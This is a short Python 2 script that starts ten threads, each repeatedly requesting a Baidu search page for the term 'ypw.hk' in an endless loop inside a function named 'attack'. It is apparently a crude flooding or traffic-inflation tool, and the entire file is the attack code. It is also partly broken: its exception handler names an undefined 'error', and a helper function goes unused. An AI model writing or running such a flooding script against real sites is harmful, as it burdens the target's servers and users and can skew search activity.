import urllib
import socket
from threading import *

url = "http://www.baidu.com/s?ie=UTF-8&wd=ypw.hk"
cishu = 0
socket.setdefaulttimeout(15)


def zhongjian(yourstr, leftstr, rightstr):
    leftposition = yourstr.find(leftstr)
    rightposition = yourstr.find(rightstr, leftposition)
    return yourstr[leftposition+len(leftstr):rightposition]


def gethtml():
    global cishu
    cishu += 1
    print cishu
    urllib.urlopen(url).read()


def attack():
    while True:
        try:
            gethtml()
        except error:
            pass


def run():
    t = Thread(target=attack)
    t.start()

for i in range(10):
    run()

